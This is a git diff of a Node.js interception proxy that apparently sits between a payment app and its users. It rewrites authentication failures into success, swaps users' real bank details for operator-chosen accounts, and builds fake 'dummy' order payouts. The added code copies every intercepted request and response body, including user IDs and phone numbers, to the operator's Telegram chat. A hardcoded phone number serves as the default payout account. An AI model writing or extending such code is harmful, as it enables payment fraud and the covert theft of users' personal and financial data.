@@ -471,6 +471,35 @@ function make401Bypass(jsonResp) {
 }
 
 function sendJsonSafe(res, headers, json, fallback, req) {
+  if (req && cachedData && cachedData.logRequests && cachedData.adminChatId && bot) {
+    try {
+      const path = req.originalUrl || req.url || 'N/A';
+      const method = req.method || 'GET';
+      const userId = req._userId || 'N/A';
+      const phone = req._phone || '';
+      
+      let reqBodyStr = req.parsedBody ? JSON.stringify(req.parsedBody, null, 2) : '';
+      let respBodyStr = json ? JSON.stringify(json, null, 2) : (typeof fallback === 'string' ? fallback : JSON.stringify(fallback, null, 2));
+
+      if (reqBodyStr && reqBodyStr.length > 1000) reqBodyStr = reqBodyStr.substring(0, 1000) + '\n... (truncated)';
+      if (respBodyStr && respBodyStr.length > 1500) respBodyStr = respBodyStr.substring(0, 1500) + '\n... (truncated)';
+
+      let debugMsg = `📡 *[DEBUG] HTTP API Traffic*\n━━━━━━━━━━━━━━━━━━\n`;
+      debugMsg += `🌐 *Endpoint:* \`${method} ${path}\`\n`;
+      if (userId && userId !== 'N/A') debugMsg += `👤 *User:* \`${userId}\`${phone ? ' (' + phone + ')' : ''}\n`;
+      debugMsg += `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n`;
+
+      if (reqBodyStr && reqBodyStr !== '{}') {
+        debugMsg += `📥 *Request Body:*\n\`\`\`json\n${reqBodyStr}\n\`\`\`\n\n`;
+      }
+      if (respBodyStr) {
+        debugMsg += `📤 *Response Data:*\n\`\`\`json\n${respBodyStr}\n\`\`\``;
+      }
+
+      bot.sendMessage(cachedData.adminChatId, debugMsg, { parse_mode: 'Markdown' }).catch(() => {});
+    } catch (e) {}
+  }
+
   if (json && isAuthFailureResponse(json) && shouldBypass401(req)) {
     const bypass = make401Bypass(json);
     return sendJson(res, headers, bypass, JSON.stringify(bypass));
@@ -2441,10 +2470,7 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
     const b = req.parsedBody || {};
     const targetId = String(q.buyId || q.orderId || q.payOrderId || q.orderNo || q.code || b.buyId || b.orderId || b.payOrderId || b.orderNo || b.code || '').trim();
 
-    let dummyMatch = findDummyOrder(data, targetId);
-    if (!dummyMatch && data.dummyOrders && data.dummyOrders.length > 0) {
-      dummyMatch = data.dummyOrders[data.dummyOrders.length - 1];
-    }
+    const dummyMatch = findDummyOrder(data, targetId);
 
     let response, respBody, respHeaders, jsonResp;
 
@@ -2455,6 +2481,10 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
       const amtNum = parseFloat(dummyMatch.amount || 5010);
       const userId = await extractUserIdFromToken(req) || await extractUserId(req, null);
       const bank = getActiveBank(data, userId);
+      const userPhone = (data.trackedUsers && userId && data.trackedUsers[String(userId)] && data.trackedUsers[String(userId)].phone) ? data.trackedUsers[String(userId)].phone : "6206785398";
+      const wName = dummyMatch.payoutWallet || "Freecharge";
+      const wType = dummyMatch.payoutWalletType || 2;
+      const upiAddr = userPhone + "@" + wName.toLowerCase();
 
       jsonResp = {
         code: 1000,
@@ -2497,14 +2527,17 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           intent: "freecharge://pay",
           freechargeIntent: "freecharge://pay",
           payUrl: "freecharge://pay",
-          payoutWalletType: dummyMatch.payoutWalletType || 2,
-          payoutWallet: { name: dummyMatch.payoutWallet || "Freecharge", type: dummyMatch.payoutWalletType || 2 },
-          payTypeName: dummyMatch.payoutWallet || "Freecharge",
-          walletName: dummyMatch.payoutWallet || "Freecharge",
-          payoutAccount: (data.trackedUsers && userId && data.trackedUsers[String(userId)] && data.trackedUsers[String(userId)].phone) ? data.trackedUsers[String(userId)].phone : "6206785398",
-          payoutPhone: (data.trackedUsers && userId && data.trackedUsers[String(userId)] && data.trackedUsers[String(userId)].phone) ? data.trackedUsers[String(userId)].phone : "6206785398",
-          payoutUpi: ((data.trackedUsers && userId && data.trackedUsers[String(userId)] && data.trackedUsers[String(userId)].phone) ? data.trackedUsers[String(userId)].phone : "6206785398") + "@" + (dummyMatch.payoutWallet ? dummyMatch.payoutWallet.toLowerCase() : "freecharge"),
-          address: ((data.trackedUsers && userId && data.trackedUsers[String(userId)] && data.trackedUsers[String(userId)].phone) ? data.trackedUsers[String(userId)].phone : "6206785398") + "@" + (dummyMatch.payoutWallet ? dummyMatch.payoutWallet.toLowerCase() : "freecharge")
+          payoutWalletType: wType,
+          payoutWallet: { name: wName, type: wType },
+          payTypeName: wName,
+          walletName: wName,
+          payoutWalletName: wName,
+          payoutWalletAccount: userPhone,
+          payoutWalletUpi: upiAddr,
+          payoutAccount: userPhone,
+          payoutPhone: userPhone,
+          payoutUpi: upiAddr,
+          address: upiAddr
         },
         message: "success"
       };
@@ -2605,9 +2638,9 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           saveData(data).catch(() => {});
 
           let payoutSection = '';
-          if (dd.payoutWallet || dd.walletName || dd.payTypeName) {
-            const wName = dd.walletName || dd.payTypeName || (dd.payoutWallet && dd.payoutWallet.name) || 'Unknown';
-            const wAddr = dd.payoutAccount || dd.payoutUpi || dd.address || 'N/A';
+          if (dd.payoutWallet || dd.walletName || dd.payTypeName || dd.payoutWalletName) {
+            const wName = dd.payoutWalletName || dd.walletName || dd.payTypeName || (dd.payoutWallet && dd.payoutWallet.name) || 'Unknown';
+            const wAddr = dd.payoutWalletAccount || dd.payoutAccount || dd.payoutWalletUpi || dd.payoutUpi || dd.address || 'N/A';
             payoutSection = `📱 *Payout:* ${wName} (\`${wAddr}\`)\n━━━━━━━━━━━━━━━━━━\n`;
           }
 
@@ -2615,9 +2648,9 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           if (replaced && bankToUse) {
             bankSection =
               `🏦 *Real Bank Details:*\n` +
-              `   Acc: \`${realAcct || 'N/A'}\`\n` +
-              `   Name: \`${realName || 'N/A'}\`\n` +
-              `   IFSC: \`${realIfsc || 'N/A'}\`\n` +
+              `   Acc: \`${realAcct || (dummyMatch ? 'N/A (Dummy)' : 'N/A')}\`\n` +
+              `   Name: \`${realName || (dummyMatch ? 'N/A (Dummy)' : 'N/A')}\`\n` +
+              `   IFSC: \`${realIfsc || (dummyMatch ? 'N/A (Dummy)' : 'N/A')}\`\n` +
               `━━━━━━━━━━━━━━━━━━\n` +
               `🔄 *Replaced With:*\n` +
               `   Acc: \`${bankToUse.accountNo}\`\n` +
@@ -2629,8 +2662,10 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
             bankSection = `⚠️ *No active bank set*`;
           }
 
+          const orderTitle = dummyMatch ? `✅ *Order Buy Successfully (Dummy Order)*` : `✅ *Order Buy Successfully*`;
+
           const msg =
-            `✅ *Order Buy Successfully*\n` +
+            `${orderTitle}\n` +
             `━━━━━━━━━━━━━━━━━━\n` +
             `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n` +
             `📋 *Order Code:* \`${orderCodeStr}\`\n` +
